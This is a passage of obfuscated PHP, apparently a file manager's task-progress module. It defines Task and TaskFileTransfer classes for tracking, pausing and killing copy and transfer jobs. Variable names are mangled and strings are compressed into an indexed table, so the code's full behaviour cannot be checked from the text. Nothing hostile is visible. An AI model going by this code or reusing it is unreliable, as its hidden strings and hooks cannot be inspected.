<?php
 goto aÂƒµÂ”¸î; Aöï…ŸåÍ: $oaswbmcnjf = $_SERVER[€ä¾™²][708]; $_SERVER[ÃË¡] = explode($_SERVER[€ä¾™²][709], gzinflate(substr($_SERVER[€ä¾™²][710], 10, -8))); $ewrdyvgauh = $_SERVER[€ä¾™²][711]; goto FÒì…ÕÉ¾©; AˆŒ™ê÷ø¾: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\151\156\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ØšŸÚ, $ÍÈüÜ®· = '', $™®À‰¤Û = 0, $¦®‡«²Ã = '') { $âÈ¨Èé =& $_SERVER[€ä¾™²]; if (self::get($ØšŸÚ)) { return; } $this->task = array($âÈ¨Èé[486] => $ØšŸÚ, $âÈ¨Èé[1539] => USER_ID, $âÈ¨Èé[1810] => $¦®‡«²Ã, $âÈ¨Èé[547] => $âÈ¨Èé[12], $âÈ¨Èé[33] => $ÍÈüÜ®·, $âÈ¨Èé[1177] => $âÈ¨Èé[12], $âÈ¨Èé[1175] => $™®À‰¤Û, $âÈ¨Èé[1922] => 0, $âÈ¨Èé[1923] => 0, $âÈ¨Èé[1924] => 0, $âÈ¨Èé[1925] => timeFloat(), $âÈ¨Èé[1926] => 0, $âÈ¨Èé[1927] => 0, $âÈ¨Èé[1928] => 0, $âÈ¨Èé[1929] => 0, $âÈ¨Èé[850] => $âÈ¨Èé[1872]); $GLOBALS[$âÈ¨Èé[1930]] = 1; Hook::bind($âÈ¨Èé[1876], array($this, $âÈ¨Èé[1931])); Hook::bind($âÈ¨Èé[1932], array($this, $âÈ¨Èé[1933])); $this->startAfter(); Hook::trigger($âÈ¨Èé[1934], $this->task); $this->task[$âÈ¨Èé[1927]] = timeFloat(); } public function end($Ü¢…Æ—Â = '') { $ É€ÃØ =& $_SERVER[€ä¾™²]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ É€ÃØ[1927]]) { self::valueSet($this->task[$ É€ÃØ[486]], !1); } $this->isEnd = !0; if ($Ü¢…Æ—Â) { $this->task[$ É€ÃØ[547]] = $Ü¢…Æ—Â; } self::log($ É€ÃØ[1935] . $this->task[$ É€ÃØ[486]] . $ É€ÃØ[1936] . sprintf($ É€ÃØ[962], timeFloat() - $this->task[$ É€ÃØ[1925]]) . $ É€ÃØ[1937]); Hook::unbind($ É€ÃØ[1876], array($this, $ É€ÃØ[1931])); Hook::unbind($ É€ÃØ[1932], array($this, $ É€ÃØ[1933])); $this->endAfter(); $ëÖñ®• = $this->task; $this->task = !1; Hook::trigger($ É€ÃØ[1938], $ëÖñ®•); } public function update($¦úğªÑÊ = 0, $§†Ğœù = false) { $åÂñ³ÈÁ =& $_SERVER[€ä¾™²]; $ ÓÆ¡èû =& $this->task; if (!$ ÓÆ¡èû) { return; } $ ÓÆ¡èû[$åÂñ³ÈÁ[1922]] += $¦úğªÑÊ; $ ÓÆ¡èû[$åÂñ³ÈÁ[1926]] = timeFloat(); if ($ ÓÆ¡èû[$åÂñ³ÈÁ[1175]]) { if ($ ÓÆ¡èû[$åÂñ³ÈÁ[1175]] < $ ÓÆ¡èû[$åÂñ³ÈÁ[1922]]) { $ ÓÆ¡èû[$åÂñ³ÈÁ[1175]] = $ ÓÆ¡èû[$åÂñ³ÈÁ[1922]]; } $õã´×¨Ï = timeFloat() - $ ÓÆ¡èû[$åÂñ³ÈÁ[1925]] - $ ÓÆ¡èû[$åÂñ³ÈÁ[1928]]; if ($õã´×¨Ï <= 0) { $õã´×¨Ï = 0.001; } $ ÓÆ¡èû[$åÂñ³ÈÁ[1923]] = $ ÓÆ¡èû[$åÂñ³ÈÁ[1922]] / $ ÓÆ¡èû[$åÂñ³ÈÁ[1175]]; $ ÓÆ¡èû[$åÂñ³ÈÁ[1924]] = $ ÓÆ¡èû[$åÂñ³ÈÁ[1922]] / $õã´×¨Ï; if ($ ÓÆ¡èû[$åÂñ³ÈÁ[1923]] > 0) { $ ÓÆ¡èû[$åÂñ³ÈÁ[1929]] = $õã´×¨Ï * (1 - $ ÓÆ¡èû[$åÂñ³ÈÁ[1923]]) / $ ÓÆ¡èû[$åÂñ³ÈÁ[1923]]; } $ ÓÆ¡èû[$åÂñ³ÈÁ[1929]] = $ ÓÆ¡èû[$åÂñ³ÈÁ[1929]] <= 0 ? 0 : $ ÓÆ¡èû[$åÂñ³ÈÁ[1929]]; } $this->updateAfter(); $‘Íê÷ùÁ = 0.2; if (timeFloat() - $ ÓÆ¡èû[$åÂñ³ÈÁ[1927]] < $‘Íê÷ùÁ && !$§†Ğœù) { return; } $ÙÊ†¾äì = self::get($ ÓÆ¡èû[$åÂñ³ÈÁ[486]]); $‚Áçç‡¶ = $ÙÊ†¾äì[$åÂñ³ÈÁ[850]]; if ($‚Áçç‡¶ == self::STATYS_KILL) { $—ÀèÇ–” = array($åÂñ³ÈÁ[1939] => LNG($åÂñ³ÈÁ[1940]), $åÂñ³ÈÁ[1346] => !1); Cache::set($åÂñ³ÈÁ[1941] . $this->task[$åÂñ³ÈÁ[486]], $—ÀèÇ–”, 30); $this->onKill(); $this->end(); die; } else { if ($‚Áçç‡¶ == self::STATYS_STOP) { $•àŸÌ¯Â = 2; $ÙÊ†¾äì[$åÂñ³ÈÁ[1928]] += $•àŸÌ¯Â; self::valueSet($ ÓÆ¡èû[$åÂñ³ÈÁ[486]], $ÙÊ†¾äì); sleep($•àŸÌ¯Â); $this->update(); return; } } $ ÓÆ¡èû[$åÂñ³ÈÁ[850]] = $‚Áçç‡¶ ? $‚Áçç‡¶ : $ ÓÆ¡èû[$åÂñ³ÈÁ[850]]; $ ÓÆ¡èû[$åÂñ³ÈÁ[1928]] = $ÙÊ†¾äì[$åÂñ³ÈÁ[1928]] ? $ÙÊ†¾äì[$åÂñ³ÈÁ[1928]] : 0; $ ÓÆ¡èû[$åÂñ³ÈÁ[1927]] = timeFloat(); Hook::trigger($åÂñ³ÈÁ[1942], $ ÓÆ¡èû); self::valueSet($ ÓÆ¡èû[$åÂñ³ÈÁ[486]], $ ÓÆ¡èû); } public function onKillSet($ÎßêÍ°, $¼÷‡ãÂ³ = array()) { $this->onKillCall = array($ÎßêÍ°, $¼÷‡ãÂ³); } public function onKill() { $šŸ£¨ =& $_SERVER[€ä¾™²]; self::log($šŸ£¨[1935] . $this->task[$šŸ£¨[486]] . $šŸ£¨[1943]); Hook::trigger($šŸ£¨[1944], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¥ŒÊ©¨¡) { $€åÛŠÑÍ =& $_SERVER[€ä¾™²]; Cache::set($€åÛŠÑÍ[1941] . $this->task[$€åÛŠÑÍ[486]], $¥ŒÊ©¨¡, 60); if (!is_array($¥ŒÊ©¨¡) || !$¥ŒÊ©¨¡[$€åÛŠÑÍ[1346]]) { self::log($€åÛŠÑÍ[1945] . json_encode($¥ŒÊ©¨¡)); } return $¥ŒÊ©¨¡; } public static function get($Ï¡È€¶Œ) { $¬¿§Ä¥ó =& $_SERVER[€ä¾™²]; $Ô—ˆ•·Ü = self::valueGet($Ï¡È€¶Œ); if (is_array($Ô—ˆ•·Ü) && $Ô—ˆ•·Ü[$¬¿§Ä¥ó[1946]]) { $£–§îùã = ActionApply($Ô—ˆ•·Ü[$¬¿§Ä¥ó[1946]], array($Ô—ˆ•·Ü)); $Ô—ˆ•·Ü = is_array($£–§îùã) ? $£–§îùã : $Ô—ˆ•·Ü; } return $Ô—ˆ•·Ü; } public static function listData() { $íÕÍöÜ« = self::valueGet(); return array_sort_by($íÕÍöÜ«, $_SERVER[€ä¾™²][1925], !0); } public static function kill($¢Ğ®¤İ©) { return self::changeStatus($¢Ğ®¤İ©, self::STATYS_KILL); } public static function stop($ŠèÚÈé¨) { return self::changeStatus($ŠèÚÈé¨, self::STATYS_STOP); } public static function restart($º„ë¾æ¸) { return self::changeStatus($º„ë¾æ¸, self::STATYS_RUNNING); } public static function killAll() { $Ï†œè½ =& $_SERVER[€ä¾™²]; $˜¿—ËÌ½ = self::listData(); foreach ($˜¿—ËÌ½ as $Óëõ¥Ò) { self::kill($Óëõ¥Ò[$Ï†œè½[486]]); } sleep(2); foreach ($˜¿—ËÌ½ as $Óëõ¥Ò) { self::valueSet($Óëõ¥Ò[$Ï†œè½[486]], !1); } } private static function changeStatus($ÜïÜÜë“, $ÅØó²¾¼) { $¾˜åŠÖ =& $_SERVER[€ä¾™²]; $¥ÔØœŸè = self::valueGet($ÜïÜÜë“); if (!$¥ÔØœŸè) { return !1; } $¥ÔØœŸè[$¾˜åŠÖ[850]] = $ÅØó²¾¼; self::valueSet($ÜïÜÜë“, $¥ÔØœŸè); self::log($¾˜åŠÖ[1947] . $¥ÔØœŸè[$¾˜åŠÖ[486]] . $¾˜åŠÖ[1948] . $ÅØó²¾¼); return !0; } public static function valueGet($…™ÏîÊ· = false) { $Ñ®°Øå· =& $_SERVER[€ä¾™²]; if ($…™ÏîÊ·) { $ÚøîÈÉ = Model($Ñ®°Øå·[541])->where(array($Ñ®°Øå·[95] => $…™ÏîÊ·, $Ñ®°Øå·[33] => $Ñ®°Øå·[1184]))->find(); return $ÚøîÈÉ ? json_decode($ÚøîÈÉ[$Ñ®°Øå·[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ğ÷¶¬ñí = false) { $õŒ±‡»Õ =& $_SERVER[€ä¾™²]; $ú©ôÚí = array($õŒ±‡»Õ[33] => $õŒ±‡»Õ[1184]); if ($Ğ÷¶¬ñí) { $ú©ôÚí[$õŒ±‡»Õ[1539]] = $Ğ÷¶¬ñí; } $ÉÌ¶ª’ = Model($õŒ±‡»Õ[541])->where($ú©ôÚí)->select(); $ÉÌ¶ª’ = $ÉÌ¶ª’ ? $ÉÌ¶ª’ : array(); foreach ($ÉÌ¶ª’ as $ìÎ¤‹Ğ => $Î³¼æ‡ö) { $ÉÌ¶ª’[$ìÎ¤‹Ğ] = json_decode($Î³¼æ‡ö[$õŒ±‡»Õ[451]], !0); } return $ÉÌ¶ª’; } public static function valueSet($£âÙ¡Û†, $Äõ²û) { $®Œ—Ÿè¡ =& $_SERVER[€ä¾™²]; if (!$Äõ²û) { return Model($®Œ—Ÿè¡[541])->where(array($®Œ—Ÿè¡[95] => $£âÙ¡Û†, $®Œ—Ÿè¡[33] => $®Œ—Ÿè¡[1184]))->delete(); } $²¤»Úà = json_encode($Äõ²û); if (!$²¤»Úà) { ob_start(); var_dump($Äõ²û); $°°Ş£¼ü = ob_get_clean(); self::log($®Œ—Ÿè¡[1949] . json_encode_force($°°Ş£¼ü)); } if (!$£âÙ¡Û† || !$Äõ²û[$®Œ—Ÿè¡[486]]) { return !1; } $ÎŒ³ó‹ó = array($®Œ—Ÿè¡[33] => $®Œ—Ÿè¡[1184], $®Œ—Ÿè¡[1539] => USER_ID, $®Œ—Ÿè¡[95] => $£âÙ¡Û†, $®Œ—Ÿè¡[451] => $²¤»Úà); $çŞÏñØ× = $®Œ—Ÿè¡[1950]; CacheLock::lock($çŞÏñØ×); Model($®Œ—Ÿè¡[541])->add($ÎŒ³ó‹ó, array(), !0); CacheLock::unlock($çŞÏñØ×); } public static function log($ã€ºĞ¥) { if (!GLOBAL_DEBUG) { return; } write_log($ã€ºĞ¥, $_SERVER[€ä¾™²][1951]); } } class TaskFileTransfer extends Task { protected function startAfter() { $êîæêÇÒ =& $_SERVER[€ä¾™²]; $Êş†±Š =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($êîæêÇÒ[1952], array($this, $êîæêÇÒ[1953])); Hook::bind($êîæêÇÒ[1357], array($this, $êîæêÇÒ[1954])); Hook::bind($êîæêÇÒ[1955], array($this, $êîæêÇÒ[1956])); Hook::bind($êîæêÇÒ[697], array($this, $êîæêÇÒ[1957])); Hook::bind($êîæêÇÒ[698], array($this, $êîæêÇÒ[1958])); Hook::bind($êîæêÇÒ[704], array($this, $êîæêÇÒ[1959])); Hook::bind($êîæêÇÒ[705], array($this, $êîæêÇÒ[1960])); Hook::bind($êîæêÇÒ[700], array($this, $êîæêÇÒ[1961])); Hook::bind($êîæêÇÒ[702], array($this, $êîæêÇÒ[1962])); Hook::bind($êîæêÇÒ[666], array($this, $êîæêÇÒ[1963])); Hook::bind($êîæêÇÒ[663], array($this, $êîæêÇÒ[1963])); Hook::bind($êîæêÇÒ[668], array($this, $êîæêÇÒ[1963])); Hook::bind($êîæêÇÒ[670], array($this, $êîæêÇÒ[1963])); Hook::bind($êîæêÇÒ[672], array($this, $êîæêÇÒ[1963])); Hook::bind($êîæêÇÒ[1964], array($this, $êîæêÇÒ[1965])); Hook::bind($êîæêÇÒ[688], array($this, $êîæêÇÒ[1966])); $this->sourceModelCopyFlag = !1; Hook::bind($êîæêÇÒ[1967], array($this, $êîæêÇÒ[1968])); Hook::bind($êîæêÇÒ[1969], array($this, $êîæêÇÒ[1970])); Hook::bind($êîæêÇÒ[1971], array($this, $êîæêÇÒ[1972])); $Êş†±Š[$êîæêÇÒ[1973]] = LNG($êîæêÇÒ[1974]); $Êş†±Š[$êîæêÇÒ[1975]] = 0; $Êş†±Š[$êîæêÇÒ[1976]] = 0; $Êş†±Š[$êîæêÇÒ[1177]] = $êîæêÇÒ[12]; $Êş†±Š[$êîæêÇÒ[1977]] = $êîæêÇÒ[12]; $Êş†±Š[$êîæêÇÒ[1978]] = 0; $Êş†±Š[$êîæêÇÒ[1979]] = 0; $Êş†±Š[$êîæêÇÒ[1980]] = 0; if (!$Êş†±Š[$êîæêÇÒ[1810]]) { $Êş†±Š[$êîæêÇÒ[1810]] = LNG($êîæêÇÒ[1981]); } } protected function endAfter() { $ş©ˆ«âÆ =& $_SERVER[€ä¾™²]; Hook::unbind($ş©ˆ«âÆ[1952], array($this, $ş©ˆ«âÆ[1953])); Hook::unbind($ş©ˆ«âÆ[1357], array($this, $ş©ˆ«âÆ[1954])); Hook::unbind($ş©ˆ«âÆ[1955], array($this, $ş©ˆ«âÆ[1956])); Hook::unbind($ş©ˆ«âÆ[697], array($this, $ş©ˆ«âÆ[1957])); Hook::unbind($ş©ˆ«âÆ[698], array($this, $ş©ˆ«âÆ[1958])); Hook::unbind($ş©ˆ«âÆ[704], array($this, $ş©ˆ«âÆ[1959])); Hook::unbind($ş©ˆ«âÆ[705], array($this, $ş©ˆ«âÆ[1960])); Hook::unbind($ş©ˆ«âÆ[700], array($this, $ş©ˆ«âÆ[1961])); Hook::unbind($ş©ˆ«âÆ[702], array($this, $ş©ˆ«âÆ[1962])); Hook::unbind($ş©ˆ«âÆ[666], array($this, $ş©ˆ«âÆ[1963])); Hook::unbind($ş©ˆ«âÆ[663], array($this, $ş©ˆ«âÆ[1963])); Hook::unbind($ş©ˆ«âÆ[668], array($this, $ş©ˆ«âÆ[1963])); Hook::unbind($ş©ˆ«âÆ[670], array($this, $ş©ˆ«âÆ[1963])); Hook::unbind($ş©ˆ«âÆ[672], array($this, $ş©ˆ«âÆ[1963])); Hook::unbind($ş©ˆ«âÆ[1964], array($this, $ş©ˆ«âÆ[1965])); Hook::unbind($ş©ˆ«âÆ[688], array($this, $ş©ˆ«âÆ[1966])); Hook::unbind($ş©ˆ«âÆ[1967], array($this, $ş©ˆ«âÆ[1968])); Hook::unbind($ş©ˆ«âÆ[1969], array($this, $ş©ˆ«âÆ[1970])); Hook::unbind($ş©ˆ«âÆ[1971], array($this, $ş©ˆ«âÆ[1972])); } public function copyMoveStart($áÆœ³áµ, $İ¦‚Ñà”, $³½²ºÉÆ, $´„†œ‡í) { $Ë—úââ =& $_SERVER[€ä¾™²]; self::log($Ë—úââ[1982] . $İ¦‚Ñà” . $Ë—úââ[73] . $´„†œ‡í); $œªŸóŒŒ = rtrim(TEMP_FILES, $Ë—úââ[8]); if (substr($İ¦‚Ñà”, 0, strlen($œªŸóŒŒ)) == $œªŸóŒŒ) { return; } if (substr($´„†œ‡í, 0, strlen($œªŸóŒŒ)) == $œªŸóŒŒ) { return; } $µøÎ×›“ =& $this->task; $µøÎ×›“[$Ë—úââ[1983]] = KodIO::transferType($áÆœ³áµ, $³½²ºÉÆ); self::log($Ë—úââ[1984] . $µøÎ×›“[$Ë—úââ[1983]] . $Ë—úââ[74] . $İ¦‚Ñà” . $Ë—úââ[73] . $´„†œ‡í); $this->update(); } public function updateAfter() { $¾éƒÛ‡Ü =& $_SERVER[€ä¾™²]; $ğÃØº =& $this->task; if (!$ğÃØº[$¾éƒÛ‡Ü[864]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ğÃØº[$¾éƒÛ‡Ü[1983]] == $¾éƒÛ‡Ü[1460]) { return; } self::updateTask($ğÃØº); } private static function updateTask(&$¼§ãí½ª) { $ş«Âî„¸ =& $_SERVER[€ä¾™²]; if ($¼§ãí½ª[$ş«Âî„¸[1983]] == $ş«Âî„¸[1328] || $¼§ãí½ª[$ş«Âî„¸[1983]] == $ş«Âî„¸[108]) { if ($¼§ãí½ª[$ş«Âî„¸[1977]]) { $¼§ãí½ª[$ş«Âî„¸[1980]] = $¼§ãí½ª[$ş«Âî„¸[1979]] + $¼§ãí½ª[$ş«Âî„¸[1976]]; } } else { if ($¼§ãí½ª[$ş«Âî„¸[1983]] == $ş«Âî„¸[1461]) { if ($¼§ãí½ª[$ş«Âî„¸[1977]] == $ş«Âî„¸[1328]) { $¼§ãí½ª[$ş«Âî„¸[1980]] = $¼§ãí½ª[$ş«Âî„¸[1979]] + $¼§ãí½ª[$ş«Âî„¸[1976]] * 0.5; } else { if ($¼§ãí½ª[$ş«Âî„¸[1977]] == $ş«Âî„¸[108]) { $¼§ãí½ª[$ş«Âî„¸[1980]] = $¼§ãí½ª[$ş«Âî„¸[1979]] + $¼§ãí½ª[$ş«Âî„¸[1975]] * 0.5 + $¼§ãí½ª[$ş«Âî„¸[1976]] * 0.5; } } } } $¼§ãí½ª[$ş«Âî„¸[1923]] = $¼§ãí½ª[$ş«Âî„¸[1980]] / $¼§ãí½ª[$ş«Âî„¸[864]]; if ($¼§ãí½ª[$ş«Âî„¸[1923]] > 0) { $ïÈİ÷ü = timeFloat() - $¼§ãí½ª[$ş«Âî„¸[1925]] - $¼§ãí½ª[$ş«Âî„¸[1928]]; $¼§ãí½ª[$ş«Âî„¸[1929]] = $ïÈİ÷ü * (1 - $¼§ãí½ª[$ş«Âî„¸[1923]]) / $¼§ãí½ª[$ş«Âî„¸[1923]]; } $—¸éàğ® = $¼§ãí½ª[$ş«Âî„¸[1976]] . $ş«Âî„¸[946] . $¼§ãí½ª[$ş«Âî„¸[1975]] . "\x3b\40{$ÛíıÁùÛ}\73" . $¼§ãí½ª[$ş«Âî„¸[1980]]; self::log($ş«Âî„¸[1985] . $¼§ãí½ª[$ş«Âî„¸[1977]] . $ş«Âî„¸[74] . $¼§ãí½ª[$ş«Âî„¸[1923]] . $ş«Âî„¸[74] . $—¸éàğ®); } public function addPath($Ñİœä¯Ù) { $ò‚¾‰§ó =& $_SERVER[€ä¾™²]; if (!$Ñİœä¯Ù) { return; } $İ¨÷¢ğ‚ =& $this->task; $±Íš¶…’ = IO::infoWithChildren($Ñİœä¯Ù); $“”ˆÁ´Ç = $İ¨÷¢ğ‚[$ò‚¾‰§ó[1986]] ? $İ¨÷¢ğ‚[$ò‚¾‰§ó[1986]][$ò‚¾‰§ó[1987]] : 0; $İ¨÷¢ğ‚[$ò‚¾‰§ó[1986]] = array($ò‚¾‰§ó[1987] => $“”ˆÁ´Ç + 1, $ò‚¾‰§ó[516] => $±Íš¶…’[$ò‚¾‰§ó[32]], $ò‚¾‰§ó[87] => $±Íš¶…’[$ò‚¾‰§ó[87]], $ò‚¾‰§ó[609] => $±Íš¶…’[$ò‚¾‰§ó[609]] ? $±Íš¶…’[$ò‚¾‰§ó[609]] : $±Íš¶…’[$ò‚¾‰§ó[87]]); if ($±Íš¶…’[$ò‚¾‰§ó[33]] == $ò‚¾‰§ó[231]) { $İ¨÷¢ğ‚[$ò‚¾‰§ó[1175]] += 1; } else { $İ¨÷¢ğ‚[$ò‚¾‰§ó[1175]] += $±Íš¶…’[$ò‚¾‰§ó[82]][$ò‚¾‰§ó[80]]; if ($±Íš¶…’[$ò‚¾‰§ó[192]]) { $İ¨÷¢ğ‚[$ò‚¾‰§ó[1175]] += $±Íš¶…’[$ò‚¾‰§ó[82]][$ò‚¾‰§ó[81]] + 1; } } $İ¨÷¢ğ‚[$ò‚¾‰§ó[864]] += $±Íš¶…’[$ò‚¾‰§ó[79]]; $this->update(); self::log(array($ò‚¾‰§ó[1988] . $Ñİœä¯Ù, $±Íš¶…’)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ô¥ù¡Ô) { } public function sourceAddHashEnd($èì„¢Àì) { } public function sourceAddFileStart($ä˜İ»øİ) { $’‘€®å— =& $_SERVER[€ä¾™²]; $º®ßşóÑ =& $this->task; $º®ßşóÑ[$’‘€®å—[1975]] = $ä˜İ»øİ[$’‘€®å—[79]]; $º®ßşóÑ[$’‘€®å—[1973]] = $ä˜İ»øİ[$’‘€®å—[32]]; $º®ßşóÑ[$’‘€®å—[1177]] = $ä˜İ»øİ[$’‘€®å—[32]]; $º®ßşóÑ[$’‘€®å—[1989]] = $ä˜İ»øİ[$’‘€®å—[87]]; $this->update(); self::log($’‘€®å—[1990] . $ä˜İ»øİ[$’‘€®å—[87]] . $’‘€®å—[1991] . $ä˜İ»øİ[$’‘€®å—[79]]); } public function sourceAddFileEnd($¾Ü¬–¿) { $Ôïåó€ =& $_SERVER[€ä¾™²]; $¬Ÿˆ™á =& $this->task; $¬Ÿˆ™á[$Ôïåó€[1980]] += $¾Ü¬–¿[$Ôïåó€[79]]; $¬Ÿˆ™á[$Ôïåó€[1989]] = $¾Ü¬–¿[$Ôïåó€[87]]; $this->update(1); self::log($Ôïåó€[1992] . $¾Ü¬–¿[$Ôïåó€[87]] . $Ôïåó€[1991] . $¾Ü¬–¿[$Ôïåó€[79]] . $Ôïåó€[1993]); } public function copyFileStart($šøÈ‡ßæ, $ô¤Š òÀ, $Ê™şì, $éĞˆô×ª, $­µÑ•, $Ü•œ¬œ) { $™ÇÃøºÔ =& $_SERVER[€ä¾™²]; $ºûÎ•Œ½ = $­µÑ•; if ($ºûÎ•Œ½ == $GLOBALS[$™ÇÃøºÔ[1994]]) { $ºûÎ•Œ½ = $GLOBALS[$™ÇÃøºÔ[1995]]; } $GLOBALS[$™ÇÃøºÔ[1995]] = $­µÑ•; $GLOBALS[$™ÇÃøºÔ[1994]] = $Ü•œ¬œ; $ª×ø ‰È =& $this->task; $ª×ø ‰È[$™ÇÃøºÔ[1973]] = $ºûÎ•Œ½; $ª×ø ‰È[$™ÇÃøºÔ[1975]] = (int) $šøÈ‡ßæ->size($ô¤Š òÀ); $ª×ø ‰È[$™ÇÃøºÔ[1976]] = 0; $ª×ø ‰È[$™ÇÃøºÔ[1177]] = $™ÇÃøºÔ[12]; $ª×ø ‰È[$™ÇÃøºÔ[1977]] = $™ÇÃøºÔ[12]; $ª×ø ‰È[$™ÇÃøºÔ[1978]] = 0; $äù²ƒ = $ª×ø ‰È[$™ÇÃøºÔ[1975]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ª×ø ‰È[$™ÇÃøºÔ[486]] . $™ÇÃøºÔ[1996]); if ($äù²ƒ && file_exists(get_path_father($éĞˆô×ª))) { Cache::set($ª×ø ‰È[$™ÇÃøºÔ[486]] . $™ÇÃøºÔ[1996], $éĞˆô×ª); $ª×ø ‰È[$™ÇÃøºÔ[1946]] = array($™ÇÃøºÔ[1997], $™ÇÃøºÔ[1998]); } $this->update(0, $äù²ƒ); self::log("\x63\x6f\x70\x79\x46\x69\154\x65\123\x74\x61\x72\x74\x3a{$ô¤Š òÀ}\73"); } public static function updateCopyLocalFileSize($Í÷şÁæ¨) { $ªêÛóõ =& $_SERVER[€ä¾™²]; $ùğç—° = Cache::get($Í÷şÁæ¨[$ªêÛóõ[486]] . $ªêÛóõ[1996]); if (!$ùğç—° || !file_exists($ùğç—°)) { return $Í÷şÁæ¨; } $Í÷şÁæ¨[$ªêÛóõ[1976]] = @filesize($ùğç—°); $Í÷şÁæ¨[$ªêÛóõ[1980]] += $Í÷şÁæ¨[$ªêÛóõ[1976]]; self::updateTask($Í÷şÁæ¨); return $Í÷şÁæ¨; } public function copyFileEnd($‚ùÅÅ²×, $è¥›òóß, $Ô±§·è¥, $Ì°·íİ, $àÒü²Ôş, $’Ü´İÀ) { $¶‡À ¸Ğ =& $_SERVER[€ä¾™²]; $ø¨¿Ö·î =& $this->task; $ø¨¿Ö·î[$¶‡À ¸Ğ[1976]] = $ø¨¿Ö·î[$¶‡À ¸Ğ[1975]]; $ø¨¿Ö·î[$¶‡À ¸Ğ[1977]] = $¶‡À ¸Ğ[12]; unset($ø¨¿Ö·î[$¶‡À ¸Ğ[1946]]); if ($àÒü²Ôş == $ø¨¿Ö·î[$¶‡À ¸Ğ[1973]]) { $ø¨¿Ö·î[$¶‡À ¸Ğ[1979]] += $ø¨¿Ö·î[$¶‡À ¸Ğ[1975]]; $ø¨¿Ö·î[$¶‡À ¸Ğ[1980]] = $ø¨¿Ö·î[$¶‡À ¸Ğ[1979]]; $ãËßº¸ˆ = 1; if (isset($ø¨¿Ö·î[$¶‡À ¸Ğ[1989]]) && $ø¨¿Ö·î[$¶‡À ¸Ğ[1989]] == $è¥›òóß) { $ãËßº¸ˆ = 0; } $this->update($ãËßº¸ˆ); } else { $this->update(); $ø¨¿Ö·î[$¶‡À ¸Ğ[1976]] = 0; } Cache::remove($ø¨¿Ö·î[$¶‡À ¸Ğ[486]] . $¶‡À ¸Ğ[1996]); self::log($¶‡À ¸Ğ[1999] . $è¥›òóß . $¶‡À ¸Ğ[73] . $Ì°·íİ . $¶‡À ¸Ğ[286] . $àÒü²Ôş . $¶‡À ¸Ğ[2000] . $ø¨¿Ö·î[$¶‡À ¸Ğ[1973]]); } public function updateFileEnd($Ä‚È‰ßÈ, $Âåö©) { $„¯û™ó =& $_SERVER[€ä¾™²]; $ì…ä¦­ =& $this->task; $ì…ä¦­[$„¯û™ó[1973]] = $Ä‚È‰ßÈ; $ì…ä¦­[$„¯û™ó[1975]] = $Âåö©; $ì…ä¦­[$„¯û™ó[1979]] += $Âåö©; $ì…ä¦­[$„¯û™ó[1980]] = $ì…ä¦­[$„¯û™ó[1979]]; $this->update(1); self::log($„¯û™ó[2001] . $Ä‚È‰ßÈ); } public function sourceModelCopy($”ÏùÒöı) { $ˆÁËÕ±© =& $_SERVER[€ä¾™²]; $â‚ñÚÊ­ = $”ÏùÒöı[0]; $æ×ã©¾§ = $”ÏùÒöı[1]; $ÛÀ˜­ı¾ =& $this->task; $this->sourceModelCopyFlag = !0; $á›¨´Ø› = 0; switch ($â‚ñÚÊ­) { case $ˆÁËÕ±©[664]: $á›¨´Ø› = 1; break; case $ˆÁËÕ±©[667]: $ÛÀ˜­ı¾[$ˆÁËÕ±©[1973]] = $æ×ã©¾§[$ˆÁËÕ±©[32]]; break; case $ˆÁËÕ±©[669]: $á›¨´Ø› = intval($”ÏùÒöı[$ˆÁËÕ±©[467]] * 0.4); break; case $ˆÁËÕ±©[671]: $á›¨´Ø› = intval($”ÏùÒöı[$ˆÁËÕ±©[467]] * 0.2); break; case $ˆÁËÕ±©[673]: $á›¨´Ø› = intval($”ÏùÒöı[$ˆÁËÕ±©[467]] * 0.4); break; } $this->update($á›¨´Ø›); self::log(array("{$â‚ñÚÊ­}\x3b\x61\x64\144\75{$á›¨´Ø›}", $”ÏùÒöı)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ˆí•˜ÛÓ, $Ñ§¨Ìôã) { $ôÓ‰Î™¤ =& $_SERVER[€ä¾™²]; $this->sourceModelCopyFlag = !0; $‹èší¥à = 1; if (isset($ˆí•˜ÛÓ[$ôÓ‰Î™¤[82]])) { $‹èší¥à = $ˆí•˜ÛÓ[$ôÓ‰Î™¤[82]][$ôÓ‰Î™¤[80]]; $‹èší¥à = $‹èší¥à + $ˆí•˜ÛÓ[$ôÓ‰Î™¤[82]][$ôÓ‰Î™¤[81]] + 1; } $this->update($‹èší¥à); $this->sourceModelCopyFlag = !1; $this->log(array($ôÓ‰Î™¤[2002], $‹èší¥à, $ˆí•˜ÛÓ)); } public function sourceMove($ßèíÙ×) { $this->sourceRemove($ßèíÙ×, !1); } public function curlProgress($ŞÎİí’½, $ŸÎáÄßÍ, $¼¯à×’“, $ÀÄ«ïßÈ, $’€´²¡‚) { $ò¿•Š¾Ü =& $_SERVER[€ä¾™²]; $Æè®Àóµ =& $this->task; if ($’€´²¡‚ > 0) { $Æè®Àóµ[$ò¿•Š¾Ü[1177]] = $ò¿•Š¾Ü[2003]; $Æè®Àóµ[$ò¿•Š¾Ü[1977]] = $ò¿•Š¾Ü[108]; if ($Æè®Àóµ[$ò¿•Š¾Ü[1975]]) { $Æè®Àóµ[$ò¿•Š¾Ü[1976]] = $’€´²¡‚; } if ($Æè®Àóµ[$ò¿•Š¾Ü[1978]]) { $Æè®Àóµ[$ò¿•Š¾Ü[1976]] = $’€´²¡‚ + $Æè®Àóµ[$ò¿•Š¾Ü[1978]]; } } else { if ($¼¯à×’“ > 0) { if ($Æè®Àóµ[$ò¿•Š¾Ü[1975]] == $ŸÎáÄßÍ) { $Æè®Àóµ[$ò¿•Š¾Ü[1976]] = $¼¯à×’“; 